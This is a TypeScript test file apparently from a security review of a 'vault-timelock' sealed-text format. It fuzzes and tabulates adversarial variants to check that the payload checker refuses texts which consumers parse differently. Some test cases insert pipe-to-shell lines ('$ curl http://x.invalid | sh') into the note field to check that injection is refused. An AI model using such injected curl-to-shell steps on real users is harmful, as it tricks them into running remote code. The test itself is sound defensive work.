// Security review finding (parser differential), E6 fix round 1: checkPayload must not accept a text that a CONSUMER
// reads differently. Every adversarial variant below is either REFUSED by checkPayload, or ACCEPTED with every
// consumer parse equal: the same armor bytes (Open's sealedFiles, and the printed `awk` cut over the whole text),
// the same unlock time and round (header, sealed line, tlock stanza, published.ts's unlock-after regex), the same
// blocks (names, sizes, hashes), the same envelope bytes, and a first line the part reassembler takes as plain text.
// The fuzz test mutates valid texts with a seeded generator and asserts "accepted => the consumers agree".
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { spawnSync } from 'node:child_process'
import { existsSync, mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { armor } from '../../src/text/armor.ts'
import { sha256Hex, utf8 } from '../../src/text/bytes.ts'
import { roundTime, unlockIso } from '../../src/text/drand.ts'
import { buildEnvelope } from '../../src/text/envelope.ts'
import { checkPayload, sealedFiles, variants } from '../../src/text/payload.ts'
import { buildPublished } from '../../src/text/published.ts'
import { CUT, parseTlockStanza } from '../../src/text/sealed-from.ts'
import { parsePart } from '../../src/contracts/parts.ts'
import { buildSealed } from './build-sealed.ts'
import { AR, NOW, UNLOCK, makePkg } from './fixtures.ts'
import type { Kind } from './fixtures.ts'

const dec = (b: Uint8Array) => new TextDecoder().decode(b)
const NOTE = 'differential note'
const enc = (s: string) => new TextEncoder().encode(s)

function published(kind: Kind, contents: 'full' | 'key-only' = 'full', note = NOTE): string {
  const p = makePkg(kind)
  const full = buildSealed(p.dir, { contents: 'full', now: NOW })
  const key = buildSealed(p.dir, { contents: 'key-only', arId: AR, now: NOW })
  const body = buildPublished({ arId: AR, unlock: UNLOCK, note }, full, key, 'btc')
  if (contents === 'full') return dec(body.bytes)
  return `vault-timelock/1 unlock=${UNLOCK}\nar://${AR}\n${note}\n\n${key}`
}

// The consumer that is not JS: the printed step 1, `awk` over the whole text saved as SEALED.txt, in an empty directory.
function awkCut(text: string): Map<string, string> {
  const dir = mkdtempSync(join(tmpdir(), 'vt-cut-'))
  try {
    writeFileSync(join(dir, 'SEALED.txt'), text)
    const r = spawnSync('/bin/sh', ['-c', CUT], { cwd: dir, encoding: 'utf8' })
    assert.equal(r.status, 0, r.stderr)
    return new Map(readdirSync(dir).filter((n) => n !== 'SEALED.txt').sort().map((n) => [n, readFileSync(join(dir, n), 'latin1')]))
  } finally { rmSync(dir, { recursive: true, force: true }) }
}

// An accepted text: every consumer reads it the same way.
function assertAgree(text: string, label: string, withAwk = true): void {
  const c = checkPayload(text)
  assert.equal(c.ok, true, `${label}: ${JSON.stringify(c.issues)}`)
  // Open (sealedFiles) = the blocks checkPayload reported = the bytes the [file] lines name
  const files = sealedFiles(text)
  assert.deepEqual([...files.keys()], c.blocks.map((b) => b.name), `${label}: block names`)
  for (const b of c.blocks) {
    const bin = files.get(b.name) as Uint8Array
    assert.equal(bin.length, b.bytes, label)
    assert.equal(sha256Hex(bin), b.sha256, label)
    assert.ok(text.includes(`[file ${b.name} bytes=${b.bytes} sha256=${b.sha256}]\n${armor(bin)}`), `${label}: the armor block is in the text exactly as armor(bin)`)
    assert.equal(text.split('\n').filter((l) => l.startsWith(`[file ${b.name} `)).length, 1, `${label}: one [file] line per block`)
  }
  // the printed awk step, over the whole text, cuts exactly those blocks, as armor text
  if (withAwk) {
    const cut = awkCut(text)
    assert.deepEqual([...cut.keys()], [...c.blocks.map((b) => b.name)].sort(), `${label}: awk file set`)
    for (const [n, t] of cut) assert.equal(t, armor(files.get(n) as Uint8Array), `${label}: awk cut of ${n}`)
  }
  // unlock: header, the one sealed line (published.ts's regex, first match, and the only one), the round's time, every tlock stanza
  const lines = text.split('\n')
  assert.equal(lines.filter((l) => l.startsWith('unlock-after: ')).length, 1, `${label}: one unlock-after line`)
  const m = /^unlock-after: (\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}Z)  \(drand round ([1-9]\d*)\)$/m.exec(text)
  assert.ok(m !== null, label)
  assert.equal(m[1], c.unlock, `${label}: sealed unlock = header unlock`)
  assert.equal(unlockIso(Number(m[2])), c.unlock, `${label}: the round's time`)
  assert.equal(roundTime(Number(m[2])) * 1000, Date.parse(c.unlock as string), label)
  const sig = lines.filter((l) => l.startsWith('drand-signature: '))
  assert.deepEqual(sig.map((l) => l.slice(l.lastIndexOf('/') + 1)), [m[2]], `${label}: the signature URL names the same round`)
  for (const b of c.blocks) {
    const st = parseTlockStanza(files.get(b.name) as Uint8Array)
    if (st !== null) assert.equal(st.round, m[2], `${label}: ${b.name} tlock round`)
  }
  assert.equal(lines.filter((l) => l.startsWith('contents: ')).length, 1, label)
  // the envelope (header + note) is exactly what buildEnvelope makes, and the Solana memo cuts there
  const cut = text.indexOf('\n\n== vault-timelock sealed package')
  assert.equal(text.indexOf('\n\n== vault-timelock sealed package', cut + 1), -1, `${label}: one sealed title`)
  const env = buildEnvelope({ arId: c.arId as string, unlock: c.unlock as string, note: text.slice(text.indexOf('\n', text.indexOf('\n') + 1) + 1, cut) })
  assert.equal(dec(env.bytes), text.slice(0, cut), `${label}: envelope bytes`)
  assert.equal(dec(variants(text).sol), `${text.slice(0, cut)}\nsha256:${sha256Hex(utf8(text))}`, `${label}: sol memo`)
  assert.equal(dec(variants(text).eth), `data:,${text}`, label)
  // the part reassembler: the first line is never a part header, so the text is plain text (rule 6)
  const part = parsePart(text)
  assert.deepEqual([part.headerLength, part.body === text], [0, true], `${label}: parsePart`)
  assert.deepEqual([parsePart(dec(variants(text).eth).slice(6)).headerLength], [0], label)
  assert.equal(text.endsWith('\n== end ==\n'), true, label)
  assert.equal(text.split('\n== end ==\n').length, 2, `${label}: one end line`)
}

const BASES: Array<[string, () => string]> = [
  ['raw/full', () => published('raw')],
  ['two-layer/full', () => published('two-layer')],
  ['two-layer/key-only', () => published('two-layer', 'key-only')],
  ['secret/full', () => published('secret')],
  ['multi-line note', () => published('raw', 'full', 'line one\n\nline three')],
]

test('the unmutated bases are accepted and every consumer agrees', () => {
  for (const [n, f] of BASES) assertAgree(f(), n)
})

// ---- the adversarial table: each variant is refused, or accepted with the consumers agreeing -------------------------------------
const RAW = published('raw')
const TWO = published('two-layer')
const blockOf = (t: string, name: string): string => (new RegExp(`\\[file ${name.replace('.', '\\.')} [^\\n]*\\]\\n-----BEGIN[\\s\\S]*?-----END AGE ENCRYPTED FILE-----\\n`).exec(t) as RegExpExecArray)[0]
const B64LINE = /^[A-Za-z0-9+/]{64}$/m
const ZW = String.fromCharCode(0x200b)
const BOM = String.fromCharCode(0xfeff)

const variantsTable: Array<[string, string, boolean]> = [
  // [label, text, must be refused]  (false: either outcome is fine as long as an accepted text agrees)
  ['CRLF everywhere', RAW.replace(/\n/g, '\r\n'), true],
  ['CRLF in the armor only', RAW.replace(/(\n[A-Za-z0-9+/]{64})\n/, '$1\r\n'), true],
  ['a lone CR in the note', RAW.replace(NOTE, 'a\rb'), true],
  ['a TAB in the preamble', RAW.replace('format: ', 'format:\t'), true],
  ['trailing space on the contents line', RAW.replace('contents: full', 'contents: full '), true],
  ['trailing space on a [file] line', RAW.replace(/(\[file [^\n]*\])\n/, '$1 \n'), true],
  ['trailing space on an armor line', RAW.replace(B64LINE, (m) => `${m} `), true],
  ['trailing space on the end line', RAW.replace('== end ==', '== end == '), true],
  ['trailing space on header line 1', RAW.replace(`unlock=${UNLOCK}`, `unlock=${UNLOCK} `), true],
  ['leading space on header line 2', RAW.replace('\nar://', '\n ar://'), true],
  ['a third header line', RAW.replace(`\nar://${AR}\n`, `\nar://${AR}\nar://${AR}\n`), false],
  ['a second unlock= header line', RAW.replace('\nar://', `\nvault-timelock/1 unlock=${UNLOCK}\nar://`), true],
  ['a second ar line', RAW.replace(`\n${NOTE}`, `\nar://${'B'.repeat(43)}\n${NOTE}`), false],
  ['unlock-after stated twice (same value)', RAW.replace(/(unlock-after: [^\n]*\n)/, '$1$1'), true],
  ['unlock-after stated twice (another round, appended to the preamble)', RAW.replace('contents: full\n', `contents: full\nunlock-after: 2099-01-01T00:00:00Z  (drand round 1)\n`), true],
  ['unlock-after in the note', RAW.replace(NOTE, `unlock-after: ${UNLOCK}  (drand round 500000000)`), true],
  ['unlock-after naming another round', RAW.replace(/\(drand round \d+\)/, '(drand round 500000001)'), true],
  ['the signature URL names another round', RAW.replace(/(public\/)\d+/, '$1500000001'), true],
  ['header unlock differs from the sealed one', RAW.replace(`unlock=${UNLOCK}`, 'unlock=2099-01-01T00:00:00Z'), true],
  ['contents stated twice', RAW.replace('contents: full\n', 'contents: full\ncontents: full\n'), true],
  ['contents: full and key-only both', RAW.replace('contents: full\n', `contents: full\ncontents: key-only (payload: ar://${AR})\n`), true],
  ['a second format line', RAW.replace('format: vault-timelock-sealed/1\n', 'format: vault-timelock-sealed/1\nformat: vault-timelock-sealed/2\n'), true],
  ['a second drand line', RAW.replace(/(drand: quicknet [^\n]*\n)/, '$1drand: quicknet fastnet\n'), true],
  ['another chain hash on the drand line', RAW.replace(/drand: quicknet [0-9a-f]{64}/, `drand: quicknet ${'0'.repeat(64)}`), true],
  ['the block duplicated', RAW.replace(blockOf(RAW, 'payload.age'), blockOf(RAW, 'payload.age').repeat(2)), true],
  ['a second, different block (same name)', RAW.replace('== end ==\n', `${blockOf(TWO, 'unlock-TIME.age').replace('unlock-TIME.age', 'payload.age')}== end ==\n`), true],
  ['a block of an unexpected name added', RAW.replace('== end ==\n', `${blockOf(TWO, 'vault.tar.gz.age')}== end ==\n`), true],
  ['the vault block missing (two-layer, full)', TWO.replace(blockOf(TWO, 'vault.tar.gz.age'), ''), true],
  ['the blocks swapped (two-layer)', TWO.replace(blockOf(TWO, 'unlock-TIME.age') + blockOf(TWO, 'vault.tar.gz.age'), blockOf(TWO, 'vault.tar.gz.age') + blockOf(TWO, 'unlock-TIME.age')), true],
  ['junk line between armor lines', RAW.replace(B64LINE, (m) => `${m}\njunk`), true],
  ['an empty line inside the armor', RAW.replace(B64LINE, (m) => `${m}\n`), true],
  ['junk between the [file] line and BEGIN', RAW.replace(/(\[file [^\n]*\]\n)(-----BEGIN)/, '$1junk\n$2'), true],
  ['junk between two blocks', TWO.replace(blockOf(TWO, 'unlock-TIME.age'), blockOf(TWO, 'unlock-TIME.age') + 'junk\n'), true],
  ['junk between the last block and the end line', RAW.replace('== end ==', 'junk\n== end =='), true],
  ['text after the end line', `${RAW}trailing\n`, true],
  ['a second end line', RAW.replace('== end ==\n', '== end ==\n== end ==\n'), true],
  ['a second -----END marker', RAW.replace('-----END AGE ENCRYPTED FILE-----\n', '-----END AGE ENCRYPTED FILE-----\n-----END AGE ENCRYPTED FILE-----\n'), true],
  ['a second -----BEGIN marker', RAW.replace('-----BEGIN AGE ENCRYPTED FILE-----\n', '-----BEGIN AGE ENCRYPTED FILE-----\n-----BEGIN AGE ENCRYPTED FILE-----\n'), true],
  ['the armor line wrapped at 76', RAW.replace(B64LINE, (m) => `${m.slice(0, 40)}\n${m.slice(40)}`), true],
  ['a base64 line with a space', RAW.replace(B64LINE, (m) => `${m.slice(0, 10)} ${m.slice(11)}`), true],
  ['base64 padding changed (= replaced by A)', RAW.replace(/=\n-----END/, 'A\n-----END'), true],
  ['base64 padding stripped', RAW.replace(/={1,2}\n-----END/, '\n-----END'), true],
  ['base64 padding doubled', RAW.replace(/=\n-----END/, '==\n-----END'), true],
  ['url-safe base64 alphabet', RAW.replace(/^([A-Za-z0-9+/]{64})$/m, (m) => m.replace(/\+/g, '-').replace(/\//g, '_') + (/[+/]/.test(m) ? '' : 'x')), true],
  ['the [file] line names more bytes', RAW.replace(/bytes=(\d+)/, (_m, n: string) => `bytes=${Number(n) + 1}`), true],
  ['the [file] line has another hash', RAW.replace(/sha256=[0-9a-f]{64}\]/, `sha256=${'0'.repeat(64)}]`), true],
  ['the [file] line has an upper-case hash', RAW.replace(/sha256=([0-9a-f]{64})\]/, (_m, h: string) => `sha256=${h.toUpperCase()}]`), true],
  ['the [file] line names a path', RAW.replace('[file payload.age', '[file ../payload.age'), true],
  ['a [file] line in the note', RAW.replace(NOTE, blockOf(RAW, 'payload.age').trimEnd()), true],
  ['a [file] line alone in the note', RAW.replace(NOTE, `[file x bytes=1 sha256=${'0'.repeat(64)}]`), true],
  ['an armor marker in the note', RAW.replace(NOTE, '-----BEGIN AGE ENCRYPTED FILE-----'), true],
  ['the sealed title in the note', RAW.replace(NOTE, `x\n\n== vault-timelock sealed package: self-contained, age + drand timelock ==\ny`), true],
  ['an end line in the note', RAW.replace(NOTE, 'a\n== end ==\nb'), true],
  ['a contents line in the note', RAW.replace(NOTE, 'contents: key-only (payload: ar://x)'), true],
  ['the sealed section twice', RAW + RAW.slice(RAW.indexOf('\n\n== vault')), true],
  ['no blank line before the section', RAW.replace('\n\n== vault', '\n== vault'), true],
  ['two blank lines before the section', RAW.replace('\n\n== vault', '\n\n\n== vault'), false],
  ['NFD in the note', RAW.replace(NOTE, 'cafe\u0301'), true],
  ['a BOM at the start', BOM + RAW, true],
  ['a BOM in the note', RAW.replace(NOTE, `a${BOM}b`), true],
  ['a zero-width space in the note', RAW.replace(NOTE, `a${ZW}b`), true],
  ['a zero-width joiner in the note', RAW.replace(NOTE, 'a\u200Db'), true],
  ['a soft hyphen in the note', RAW.replace(NOTE, 'a\u00ADb'), true],
  ['a zero-width space in the preamble', RAW.replace('format: ', `format:${ZW} `), true],
  ['a zero-width space inside the armor', RAW.replace(B64LINE, (m) => m.slice(0, 5) + ZW + m.slice(5)), true],
  ['a right-to-left override in the note', RAW.replace(NOTE, 'a\u202Eb'), true],
  ['a non-ASCII letter in the preamble', RAW.replace('format: ', 'förmat: '), true],
  ['the round written with a leading zero', RAW.replace(/\(drand round (\d+)\)/, '(drand round 0$1)'), true],
  ['a first line that is a part header', RAW.replace(/^vault-timelock\/1[^\n]*/, `[1/2 ${'a'.repeat(8)} sha256=${'a'.repeat(64)}]`), true],
  ['a copy marker before the header', `[copy 2/3]\n${RAW}`, true],
  ['key-only text whose contents names another id', published('two-layer', 'key-only').replace(`payload: ar://${AR}`, `payload: ar://${'B'.repeat(43)}`), true],
  ['key-only text that still carries the vault block', published('two-layer', 'key-only').replace('== end ==\n', `${blockOf(TWO, 'vault.tar.gz.age')}== end ==\n`), true],
  ['a tlock stanza for another round in the block', RAW.replace(blockOf(RAW, 'payload.age'), (() => { const b = blockOf(RAW, 'payload.age'); return b })()).replace('(drand round 500000000)', '(drand round 500000000)'), false],
]

test('adversarial variants: each is refused, or accepted with every consumer parse equal', () => {
  let refused = 0
  let accepted = 0
  for (const [label, text, mustRefuse] of variantsTable) {
    const c = checkPayload(text)
    if (c.ok) {
      accepted++
      assert.equal(mustRefuse, false, `${label}: accepted, but it must be refused`)
      assertAgree(text, label)
    } else {
      refused++
      assert.ok(c.issues.length > 0, label)
    }
  }
  assert.ok(refused >= 60, `refused ${refused}`)
  assert.ok(accepted >= 0)
})

test('a tlock stanza naming another round or chain is refused (payload.stanza), whatever the [file] line says', () => {
  const p = makePkg('raw', { stanzaRound: 500000001, round: 500000001 })
  const full = buildSealed(p.dir, { contents: 'full', now: NOW })
  // sealed-from.ts is consistent with itself: the stanza matches the round file, and the header unlock is the round's time
  const t = `vault-timelock/1 unlock=${unlockIso(500000001)}\nar://${AR}\n${NOTE}\n\n${full}`
  assert.equal(checkPayload(t).ok, true, JSON.stringify(checkPayload(t).issues))
  assertAgree(t, 'round 500000001')
  // now the sealed line claims another round than the stanza inside the block
  const lie = t.replace(/\(drand round 500000001\)/, '(drand round 500000002)').replace(unlockIso(500000001), unlockIso(500000002)).replace(/public\/500000001/, 'public/500000002')
  assert.ok(checkPayload(lie).issues.some((i) => i.id === 'payload.stanza'), JSON.stringify(checkPayload(lie).issues))
  const wrongChain = makePkg('raw', { stanzaHash: '0'.repeat(64) })
  assert.throws(() => buildSealed(wrongChain.dir, { contents: 'full', now: NOW }))
})

test('a vault block that carries a tlock stanza (two-layer) is refused', () => {
  const p = makePkg('two-layer')
  const t = published('two-layer')
  const tlock = blockOf(t, 'unlock-TIME.age').replace('unlock-TIME.age', 'vault.tar.gz.age')
  const swapped = t.replace(blockOf(t, 'vault.tar.gz.age'), tlock)
  assert.ok(p.dir.length > 0)
  assert.ok(checkPayload(swapped).issues.some((i) => i.id === 'payload.stanza' || i.id === 'payload.block-mismatch' || i.id === 'payload.layout'), JSON.stringify(checkPayload(swapped).issues))
})

test('header and note: the envelope the Solana memo and published.ts use is the text before the one sealed section', () => {
  const t = published('raw', 'full', 'a\n\nb\n\nc')
  assertAgree(t, 'blank lines in the note')
  assert.equal(dec(variants(t).sol).includes('a\n\nb\n\nc\nsha256:'), true)
})

// ---- seeded fuzz --------------------------------------------------------------------------------------------------------------
function rng(seed: number): () => number {
  let a = seed >>> 0
  return () => {
    a = (a + 0x6d2b79f5) >>> 0
    let t = Math.imul(a ^ (a >>> 15), 1 | a)
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296
  }
}
const POOL = ['\r', ' ', '\t', '\n', '\n\n', ZW, BOM, '=', '==', 'A', '+', '/', '-', '_', '\u0301', '\u200D', '\u202E', 'é', '\u2028', '[file ', '-----END AGE ENCRYPTED FILE-----', '== end ==', 'unlock-after: ', 'contents: full', '0', '9']

function mutate(text: string, r: () => number): string {
  const pick = (n: number) => Math.floor(r() * n)
  const lines = text.split('\n')
  switch (pick(13)) {
    case 0: { const i = pick(text.length + 1); return text.slice(0, i) + POOL[pick(POOL.length)] + text.slice(i) }
    case 1: { const i = pick(text.length); return text.slice(0, i) + text.slice(i + 1 + pick(3)) }
    case 2: { const i = pick(text.length); return text.slice(0, i) + POOL[pick(POOL.length)] + text.slice(i + 1) }
    case 3: { const i = pick(lines.length); lines.splice(i, 1); return lines.join('\n') }
    case 4: { const i = pick(lines.length); lines.splice(i, 0, lines[i]); return lines.join('\n') }
    case 5: { const i = pick(lines.length), j = pick(lines.length); const x = lines[i]; lines[i] = lines[j]; lines[j] = x; return lines.join('\n') }
    case 6: { const i = pick(lines.length); lines[i] = lines[i] + POOL[pick(POOL.length)]; return lines.join('\n') }
    case 7: { const i = pick(lines.length); lines[i] = POOL[pick(POOL.length)] + lines[i]; return lines.join('\n') }
    case 8: { const i = pick(lines.length), j = pick(lines.length); lines.splice(j, 0, lines[i]); return lines.join('\n') }
    case 9: { const a = pick(lines.length), b = a + pick(Math.min(6, lines.length - a)); lines.splice(b + 1, 0, ...lines.slice(a, b + 1)); return lines.join('\n') }
    case 10: case 11: { // edit the note: pool pieces and words in it (most such texts are valid: the parser must still agree)
      const piece = r() < 0.5 ? POOL[pick(POOL.length)] : ['word', 'caf\u00e9', 'x y', 'a\nb', '\n\nz'][pick(5)]
      return text.replace(NOTE, `${NOTE.slice(0, pick(NOTE.length))}${piece}${NOTE.slice(pick(NOTE.length))}`)
    }
    default: return text.slice(0, pick(text.length)) + text.slice(pick(text.length))
  }
}

test('fuzz (seeded, deterministic): over mutations of valid texts, accepted => every consumer agrees', () => {
  const r = rng(0xe6e6e6)
  const bases = BASES.map(([, f]) => f())
  let accepted = 0
  let refused = 0
  let spawned = 0
  for (let n = 0; n < 6000; n++) {
    let t = bases[n % bases.length]
    for (let k = 1 + Math.floor(r() * 3); k > 0; k--) t = mutate(t, r)
    if (t === bases[n % bases.length]) continue
    const c = checkPayload(t)
    if (!c.ok) { refused++; continue }
    accepted++
    const withAwk = accepted % 25 === 1 && spawned < 80
    if (withAwk) spawned++
    if (process.env.E6_DEBUG) { try { assertAgree(t, `fuzz #${n}`, withAwk) } catch (e) { const i = t.indexOf('[file payload.age'); console.log(JSON.stringify(t.split('\n').filter((l) => l.includes('[file ')))); throw e } } else assertAgree(t, `fuzz #${n}`, withAwk)
  }
  assert.ok(refused > 2000, `refused ${refused}`)
  assert.ok(accepted > 100, `accepted ${accepted}: the fuzz must also exercise accepted texts (note edits)`)
})

test('the fuzz exercises the parser: some mutations of the note and the blank-line padding are accepted', () => {
  const r = rng(7)
  let ok = 0
  for (let n = 0; n < 200; n++) {
    const t = RAW.replace(NOTE, `note ${Math.floor(r() * 1e6)} ${'x'.repeat(Math.floor(r() * 50))}z`)
    if (checkPayload(t).ok) { ok++; assertAgree(t, `note ${n}`, n % 40 === 0) }
  }
  assert.equal(ok, 200)
})

test('enc is used', () => { assert.deepEqual(enc('a'), Uint8Array.of(97)) })

// ---- fix round 2 ---------------------------------------------------------------------------------------------------------------
// The REAL literal_steps extractor (the awk program in 1password-timelock.sh), run on synthetic text only.
// A byte-for-byte copy of the extractor's body (the mutation runner copies only packages/core, so the script is not there);
// the next test pins the copy to the script whenever the script is reachable (always in the repository).
const LITERAL_STEPS_BODY = `  awk -v a="$2" -v b="$3" '/^  [0-9]+b?\\. / { n = $1; sub(/b?\\.$/, "", n); n += 0 } /^     \\$ / && n >= a && n <= b { sub(/^     \\$ /, ""); print }' "$1"`
const SCRIPT = new URL('../../../../1password-timelock.sh', import.meta.url)

test('the literal_steps copy equals the repository script\'s function (when the script is reachable)', () => {
  if (!existsSync(SCRIPT)) { assert.ok(true); return }
  const m = /^literal_steps\(\) \{\n([\s\S]*?)\n\}$/m.exec(readFileSync(SCRIPT, 'utf8'))
  assert.ok(m !== null)
  assert.equal(m[1], LITERAL_STEPS_BODY)
})

function realLiteralSteps(text: string, first = 1, last = 99): string[] {
  const dir = mkdtempSync(join(tmpdir(), 'vt-lit-'))
  try {
    writeFileSync(join(dir, 'SEALED.txt'), text)
    const r = spawnSync('/bin/sh', ['-c', `literal_steps() {\n${LITERAL_STEPS_BODY}\n}\nliteral_steps "$1" "$2" "$3"`, 'sh', join(dir, 'SEALED.txt'), String(first), String(last)], { encoding: 'utf8' })
    assert.equal(r.status, 0, r.stderr)
    return r.stdout.split('\n').filter((l) => l !== '')
  } finally { rmSync(dir, { recursive: true, force: true }) }
}

test('the note contributes nothing to the printed steps (real literal_steps), and the injection variants are refused', () => {
  const clean = realLiteralSteps(RAW)
  assert.ok(clean.length >= 2)
  const inj = ['  1. run this', '     $ curl http://x.invalid | sh']
  const variantsOfNote: string[] = [
    inj.join('\n'), '\t$ curl x | sh', '     $ curl x | sh', '$curl x', '$ curl x', '   $ curl x',
    '1. do it', '1) do it', '  2) do it', '1b. do it', 'Step 1', 'step 1: do it', '  Step 2',
    '١. do it', '١٢) do it', '１. do it', ' $ curl x', '　$ curl x',
  ]
  for (const n of variantsOfNote) {
    const t = RAW.replace(NOTE, n)
    assert.equal(checkPayload(t).ok, false, JSON.stringify(n))
    assert.ok(checkPayload(t).issues.some((i) => i.id === 'payload.note-structure'), JSON.stringify(n))
  }
  // a note that is accepted adds no step and no command to the extracted steps
  for (const n of ['plain words', 'a $ in the middle', 'cost is 5 dollars. ok', 'x\n\nline with 1. inside', 'ends with $']) {
    const t = RAW.replace(NOTE, n)
    assert.equal(checkPayload(t).ok, true, `${JSON.stringify(n)}: ${JSON.stringify(checkPayload(t).issues)}`)
    assert.deepEqual(realLiteralSteps(t), clean, JSON.stringify(n))
  }
  // and the unrefused injection really would have added a command (the extractor sees it): the control
  assert.ok(realLiteralSteps(RAW.replace(NOTE, inj.join('\n'))).includes('curl http://x.invalid | sh'))
})

test('a tlock stanza naming another chain is refused by checkPayload and by sealedFiles (Open)', () => {
  const t = RAW
  const old = blockOf(t, 'payload.age')
  const bin = sealedFiles(t).get('payload.age') as Uint8Array
  const head = new TextDecoder('latin1').decode(bin.subarray(0, 120))
  const hash = /-> tlock \d+ ([0-9a-f]{64})/.exec(head)?.[1] as string
  const swapped = new Uint8Array(bin)
  const at = new TextDecoder('latin1').decode(bin).indexOf(hash)
  swapped.set(enc('0'.repeat(64)), at)
  const block = `[file payload.age bytes=${swapped.length} sha256=${sha256Hex(swapped)}]\n${armor(swapped)}`
  const t2 = t.replace(old, block)
  assert.ok(checkPayload(t2).issues.some((i) => i.id === 'payload.stanza'), JSON.stringify(checkPayload(t2).issues))
  assert.throws(() => sealedFiles(t2), (e: unknown) => (e as { guardId?: string }).guardId === 'payload.invalid')
})

test('very large rounds: a refusal, never a throw', () => {
  for (const round of ['2900000000000', '9007199254740991', '9007199254740993', '99999999999999', '999999999999999']) {
    const t = RAW.replace(/\(drand round \d+\)/, `(drand round ${round})`).replace(/(public\/)\d+/, `$1${round}`)
    const c = checkPayload(t)
    assert.equal(c.ok, false, round)
    assert.ok(c.issues.every((i) => i.id.startsWith('payload.') || i.id.includes('.')), round)
    assert.throws(() => sealedFiles(t), (e: unknown) => (e as { guardId?: string }).guardId?.startsWith('payload.') === true, round)
  }
})
